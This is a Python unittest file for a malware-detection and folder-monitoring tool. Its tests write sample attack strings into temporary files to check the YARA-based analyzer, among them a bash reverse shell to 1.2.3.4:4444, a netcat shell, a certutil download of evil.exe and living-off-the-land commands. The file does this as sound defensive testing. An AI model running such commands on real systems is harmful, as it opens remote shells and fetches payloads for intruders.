"""
Tests for Lock On monitoring system
"""

import unittest
import tempfile
import shutil
from pathlib import Path
import time

from src.core.monitor import FolderMonitor
from src.core.analyzer import PatternAnalyzer
from src.core.permissions import PermissionManager
from src.security.scanner import Scanner


class TestFolderMonitor(unittest.TestCase):
    """Test folder monitoring functionality"""

    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.monitor = FolderMonitor()
        self.monitor.set_target_folder(self.test_dir)

    def tearDown(self):
        """Clean up test environment"""
        self.monitor.stop()
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_file_detection(self):
        """Test file creation detection"""
        detected_files = []

        def on_file_changed(action, filepath):
            if action == "created":
                detected_files.append(filepath)

        self.monitor.on_file_changed = on_file_changed
        self.monitor.start()

        # Create test file
        test_file = Path(self.test_dir) / "test.txt"
        test_file.write_text("test content")

        # Wait for detection
        time.sleep(1)

        self.assertEqual(len(detected_files), 1)
        self.assertEqual(detected_files[0].name, "test.txt")

    def test_threat_detection(self):
        """Test threat detection"""
        threats_detected = []

        def on_threat(filepath, risk):
            threats_detected.append((filepath, risk))

        self.monitor.on_threat_detected = on_threat
        self.monitor.start()

        # Create suspicious file
        suspicious_file = Path(self.test_dir) / "malware.exe"
        suspicious_file.write_bytes(b"MZ\x90\x00\x03")  # PE header

        time.sleep(1)

        self.assertGreater(len(threats_detected), 0)


class TestPatternAnalyzer(unittest.TestCase):
    """Test pattern analysis"""

    def setUp(self):
        """Set up test environment"""
        self.analyzer = PatternAnalyzer()
        self.test_dir = tempfile.mkdtemp()

    def tearDown(self):
        """Clean up"""
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_suspicious_extension(self):
        """Test suspicious file extension detection"""
        # Create test file with suspicious extension
        test_file = Path(self.test_dir) / "test.exe"
        test_file.write_text("test")

        result = self.analyzer.analyze_file(test_file)

        self.assertIn(result.level, ["high", "medium"])

    def test_safe_file(self):
        """Test safe file analysis"""
        # Create safe file
        safe_file = Path(self.test_dir) / "document.txt"
        safe_file.write_text("Safe content")

        result = self.analyzer.analyze_file(safe_file)

        self.assertEqual(result.level, "low")

    def test_yara_detection(self):
        """Files matching YARA rules should be high risk"""
        suspicious = Path(self.test_dir) / "evil.bin"
        suspicious.write_bytes(b"MZ\x90\x00\x03")

        result = self.analyzer.analyze_file(suspicious)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(any("yara:" in m for m in result.details["matches"]))

    def test_eicar_detection(self):
        """EICAR test file should trigger malware detection"""
        eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        test_file = Path(self.test_dir) / "eicar.com"
        test_file.write_text(eicar)

        result = self.analyzer.analyze_file(test_file)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(any("yara:" in m for m in result.details["matches"]))

    def test_eicar_zip_detection(self):
        """Zipped EICAR file should be detected"""
        import zipfile

        eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        archive = Path(self.test_dir) / "eicar.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("eicar.com", eicar)

        result = self.analyzer.analyze_file(archive)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(any("eicar" in m.lower() for m in result.details["matches"]))

    def test_eicar_base64_detection(self):
        """Base64 encoded EICAR string should trigger detection"""
        import base64

        eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        encoded = base64.b64encode(eicar.encode()).decode()
        b64_file = Path(self.test_dir) / "eicar.txt"
        b64_file.write_text(encoded)

        result = self.analyzer.analyze_file(b64_file)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(any("eicar" in m.lower() for m in result.details["matches"]))

    def test_eicar_nested_zip_detection(self):
        """EICAR inside nested archives should be detected"""
        import zipfile
        import io

        eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w") as zf:
            zf.writestr("eicar.com", eicar)
        inner.seek(0)

        outer = Path(self.test_dir) / "nested.zip"
        with zipfile.ZipFile(outer, "w") as zf:
            zf.writestr("inner.zip", inner.getvalue())

        result = self.analyzer.analyze_file(outer)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(any("eicar" in m.lower() for m in result.details["matches"]))

    def test_macro_detection(self):
        """Suspicious macro patterns should be flagged"""
        macro_code = 'Sub AutoOpen()\n Shell("calc.exe")\nEnd Sub'
        doc = Path(self.test_dir) / "macro.doc"
        doc.write_text(macro_code)

        result = self.analyzer.analyze_file(doc)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(
            any("yara:SuspiciousMacro" in m for m in result.details["matches"])
        )

    def test_base64_command_detection(self):
        """Base64 encoded commands should trigger detection"""
        import base64

        cmd = base64.b64encode(b"powershell -nop").decode()
        b64 = Path(self.test_dir) / "payload.txt"
        b64.write_text(cmd)

        result = self.analyzer.analyze_file(b64)

        self.assertIn(result.level, ["high", "medium"])
        self.assertIn("Suspicious base64 command", result.details["matches"])

    def test_reverse_shell_detection(self):
        """Reverse shell commands should be high risk"""
        rshell = Path(self.test_dir) / "shell.sh"
        rshell.write_text("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")

        result = self.analyzer.analyze_file(rshell)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(
            any("yara:ReverseShell_Bash" in m for m in result.details["matches"])
        )

    def test_regsvr32_detection(self):
        """regsvr32 commands should be flagged as malicious"""
        script = Path(self.test_dir) / "reg.cmd"
        script.write_text("regsvr32 evil.dll")

        result = self.analyzer.analyze_file(script)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(
            any(
                "regsvr32" in m.lower() or "yara:Regsvr32_Command" in m
                for m in result.details["matches"]
            )
        )

    def test_zip_macro_detection(self):
        """Malicious macros inside archives should be detected"""
        import zipfile

        archive = Path(self.test_dir) / "doc_with_macro.docm"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("vbaProject.bin", b"evilmacro")

        result = self.analyzer.analyze_file(archive)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(
            any(
                "vbaProject.bin" in m or "yara:Zip_VBA_Project" in m
                for m in result.details["matches"]
            )
        )

    def test_ps1_extension_detection(self):
        """PowerShell scripts should be treated as suspicious"""
        ps1 = Path(self.test_dir) / "script.ps1"
        ps1.write_text("Write-Host hello")

        result = self.analyzer.analyze_file(ps1)

        self.assertIn(result.level, ["medium", "high"])

    def test_certutil_download_detection(self):
        """Certutil download commands should trigger YARA rule"""
        cmd = Path(self.test_dir) / "cu.bat"
        cmd.write_text("certutil -urlcache -f http://mal/evil.exe")

        result = self.analyzer.analyze_file(cmd)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(
            any("yara:Certutil_Download" in m for m in result.details["matches"])
        )

    def test_rundll32_detection(self):
        """Rundll32 execution should be flagged"""
        rcmd = Path(self.test_dir) / "run.cmd"
        rcmd.write_text("rundll32 evil.dll,EntryPoint")

        result = self.analyzer.analyze_file(rcmd)

        self.assertIn(result.level, ["high", "critical"])
        self.assertTrue(
            any("yara:Rundll32_Command" in m for m in result.details["matches"])
        )

    def test_meterpreter_detection(self):
        """Meterpreter keywords should trigger malware detection"""
        mtr = Path(self.test_dir) / "meterpreter.txt"
        mtr.write_text("connecting to meterpreter payload")

        result = self.analyzer.analyze_file(mtr)

        self.assertIn("yara:Meterpreter_String", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])
        meta_threats = [m.get("threat") for _, m in result.details.get("yara_meta", [])]
        self.assertIn("malware", meta_threats)

    def test_invoke_shellcode_detection(self):
        """Invoke-Shellcode should be flagged by YARA"""
        script = Path(self.test_dir) / "shell.ps1"
        script.write_text("Invoke-Shellcode -Payload test")

        result = self.analyzer.analyze_file(script)

        self.assertIn("yara:Invoke_Shellcode", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_powerview_detection(self):
        """PowerView references should trigger reconnaissance classification"""
        script = Path(self.test_dir) / "pv.ps1"
        script.write_text("Import-Module PowerView")

        result = self.analyzer.analyze_file(script)

        self.assertIn("yara:PowerView_Module", result.details["matches"])
        self.assertEqual(result.type, "reconnaissance")

    def test_ip_address_detection(self):
        """Suspicious IP addresses should raise risk"""
        txt = Path(self.test_dir) / "ip.txt"
        txt.write_text("Connecting to 10.0.0.5:4444 now")

        result = self.analyzer.analyze_file(txt)

        self.assertIn("Suspicious IP address", result.details["matches"])

    def test_process_cmdline_detection(self):
        """Suspicious command lines should mark a process as suspicious"""

        class FakeProcess:
            def __init__(self):
                self.info = {"name": "powershell.exe", "cpu_percent": 10}

            def cmdline(self):
                import base64

                encoded = base64.b64encode(b"cmd.exe /c evil").decode()
                return ["powershell.exe", "-encodedcommand", encoded]

            def parent(self):
                return None

            def name(self):
                return self.info["name"]

        fake = FakeProcess()
        self.assertTrue(self.analyzer.is_suspicious_process(fake))

    def test_process_binary_detection(self):
        """Malicious executables should make a process suspicious"""
        exe = Path(self.test_dir) / "evil.exe"
        exe.write_bytes(b"MZ\x90\x00\x03")

        class FakeProcess:
            def __init__(self, path):
                self._path = path
                self.info = {"name": Path(path).name, "cpu_percent": 5}

            def cmdline(self):
                return [self._path]

            def exe(self):
                return str(self._path)

            def parent(self):
                return None

            def name(self):
                return self.info["name"]

            def connections(self, kind="inet"):
                return []

        fake = FakeProcess(exe)
        self.assertTrue(self.analyzer.is_suspicious_process(fake))

    def test_process_network_detection(self):
        """Suspicious network connections should flag the process"""

        class FakeAddr:
            def __init__(self, ip, port):
                self.ip = ip
                self.port = port

        class FakeConn:
            def __init__(self):
                self.raddr = FakeAddr("1.2.3.4", 4444)

        class FakeProcess:
            def __init__(self):
                self.info = {"name": "python.exe", "cpu_percent": 5}

            def cmdline(self):
                return ["python.exe"]

            def connections(self, kind="inet"):
                return [FakeConn()]

            def parent(self):
                return None

            def name(self):
                return self.info["name"]

        fake = FakeProcess()
        self.assertTrue(self.analyzer.is_suspicious_process(fake))

    def test_process_env_detection(self):
        """Suspicious environment variables should flag the process"""

        class FakeProcess:
            def __init__(self):
                self.info = {"name": "python.exe", "cpu_percent": 2}

            def cmdline(self):
                return ["python.exe"]

            def environ(self):
                return {"LD_PRELOAD": "evil.so"}

            def parent(self):
                return None

            def name(self):
                return self.info["name"]

            def connections(self, kind="inet"):
                return []

        fake = FakeProcess()
        self.assertTrue(self.analyzer.is_suspicious_process(fake))

    def test_threat_type_from_yara(self):
        """Threat type classification should map YARA rules"""
        rshell = Path(self.test_dir) / "nc.txt"
        rshell.write_text("nc -e /bin/sh 1.2.3.4 1234")

        result = self.analyzer.analyze_file(rshell)

        self.assertEqual(result.type, "reverse_shell")
        meta_threats = [m.get("threat") for _, m in result.details.get("yara_meta", [])]
        self.assertIn("reverse_shell", meta_threats)

    def test_invoke_obfuscation_detection(self):
        """Invoke-Obfuscation usage should be detected"""
        script = Path(self.test_dir) / "ob.ps1"
        script.write_text("Invoke-Obfuscation -ScriptBlock")

        result = self.analyzer.analyze_file(script)

        self.assertIn("yara:Invoke_Obfuscation", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_empire_detection(self):
        """Empire references should trigger malware classification"""
        script = Path(self.test_dir) / "emp.ps1"
        script.write_text("Empire launcher")

        result = self.analyzer.analyze_file(script)

        self.assertIn("yara:Empire_PS", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_psexec_detection(self):
        """PsExec command lines should be flagged"""
        cmd = Path(self.test_dir) / "ps.bat"
        cmd.write_text("psexec \\target cmd.exe")

        result = self.analyzer.analyze_file(cmd)

        self.assertIn("yara:PsExec_Command", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_msbuild_detection(self):
        """MSBuild abuse should be detected"""
        msb = Path(self.test_dir) / "build.cmd"
        msb.write_text("msbuild.exe evil.csproj")

        result = self.analyzer.analyze_file(msb)

        self.assertIn("yara:MSBuild_Shell", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_installutil_detection(self):
        """InstallUtil execution should be suspicious"""
        iu = Path(self.test_dir) / "inst.bat"
        iu.write_text("InstallUtil.exe malware.dll")

        result = self.analyzer.analyze_file(iu)

        self.assertIn("yara:InstallUtil_Command", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_shellcode_loader_detection(self):
        """Detection of shellcode loading APIs"""
        loader = Path(self.test_dir) / "sc.txt"
        loader.write_text("VirtualAllocEx then WriteProcessMemory")

        result = self.analyzer.analyze_file(loader)

        self.assertIn("yara:Shellcode_Loader", result.details["matches"])
        self.assertEqual(result.type, "malware_loader")

    def test_njrat_detection(self):
        """njRAT strings should trigger RAT classification"""
        rat = Path(self.test_dir) / "rat.txt"
        rat.write_text("njrat remote admin tool")

        result = self.analyzer.analyze_file(rat)

        self.assertIn("yara:njRAT_String", result.details["matches"])
        self.assertEqual(result.type, "rat")

    def test_upx_detection(self):
        """UPX packed binaries should be flagged"""
        packed = Path(self.test_dir) / "packed.bin"
        packed.write_bytes(b"MZ" + b"A" * 60 + b"UPX!")

        result = self.analyzer.analyze_file(packed)

        self.assertIn("yara:UPX_Packed", result.details["matches"])

    def test_process_hollowing_detection(self):
        """Process hollowing API usage should be high risk"""
        ph = Path(self.test_dir) / "ph.txt"
        ph.write_text(
            "VirtualAllocEx WriteProcessMemory CreateRemoteThread NtUnmapViewOfSection"
        )

        result = self.analyzer.analyze_file(ph)

        self.assertIn("yara:Process_Hollowing", result.details["matches"])
        self.assertEqual(result.type, "malware_loader")

    def test_netsh_tunnel_detection(self):
        """Netsh portproxy commands should trigger C2 classification"""
        nt = Path(self.test_dir) / "net.cmd"
        nt.write_text(
            "netsh interface portproxy add v4tov4 listenport=80 connectaddress=1.2.3.4"
        )

        result = self.analyzer.analyze_file(nt)

        self.assertIn("yara:Netsh_Tunnel", result.details["matches"])
        self.assertEqual(result.type, "c2_communication")

    def test_webhook_url_detection(self):
        """Webhook URLs should trigger exfiltration detection"""
        wh = Path(self.test_dir) / "hook.txt"
        wh.write_text("https://discord.com/api/webhooks/123")

        result = self.analyzer.analyze_file(wh)

        self.assertIn("yara:Webhook_URL", result.details["matches"])
        self.assertEqual(result.type, "data_exfiltration")

    def test_autoit_detection(self):
        """Compiled AutoIt scripts should be high risk"""
        fp = Path(self.test_dir) / "script.exe"
        fp.write_text("AU3!")

        result = self.analyzer.analyze_file(fp)

        self.assertIn("yara:AutoIt_Compiled", result.details["matches"])
        self.assertIn(result.level, ["high", "critical"])

    def test_keylogger_detection(self):
        """Keylogger APIs should map to keylogger threat type"""
        fp = Path(self.test_dir) / "key.dll"
        fp.write_text("SetWindowsHookEx")

        result = self.analyzer.analyze_file(fp)

        self.assertIn("yara:Keylogger_API", result.details["matches"])
        self.assertEqual(result.type, "keylogger")

    def test_token_stealer_detection(self):
        """Discord token stealers should be detected"""
        fp = Path(self.test_dir) / "steal.txt"
        fp.write_text("discord.com/api\nAuthorization: xxx")

        result = self.analyzer.analyze_file(fp)

        self.assertIn("yara:Discord_TokenStealer", result.details["matches"])
        self.assertEqual(result.type, "credential_theft")


class TestScannerCache(unittest.TestCase):
    """Ensure scanner caching avoids duplicate scans"""

    def setUp(self):
        self.scanner = Scanner()
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_cache_hits(self):
        fp = Path(self.tmp) / "file.txt"
        fp.write_text("hello")

        first = self.scanner.scan(str(fp))
        second = self.scanner.scan(str(fp))

        self.assertEqual(first, second)


class TestPermissions(unittest.TestCase):
    """Test permission management"""

    def setUp(self):
        """Set up test environment"""
        self.permissions = PermissionManager()

    def test_file_permissions(self):
        """Test file permission checking"""
        # Test blocked extension
        blocked_file = Path("test.exe")
        allowed = self.permissions.check_file_permission(blocked_file, "create")
        self.assertFalse(allowed)

        # Test allowed file
        safe_file = Path("document.txt")
        allowed = self.permissions.check_file_permission(safe_file, "create")
        self.assertTrue(allowed)

    def test_process_permissions(self):
        """Test process permission checking"""
        # Test whitelisted process
        allowed = self.permissions.check_process_permission("python.exe", "execute")
        self.assertTrue(allowed)

        # Update blacklist
        self.permissions.update_blacklist(["malware.exe"], add=True)

        # Test blacklisted process
        allowed = self.permissions.check_process_permission("malware.exe", "execute")
        self.assertFalse(allowed)


if __name__ == "__main__":
    unittest.main()
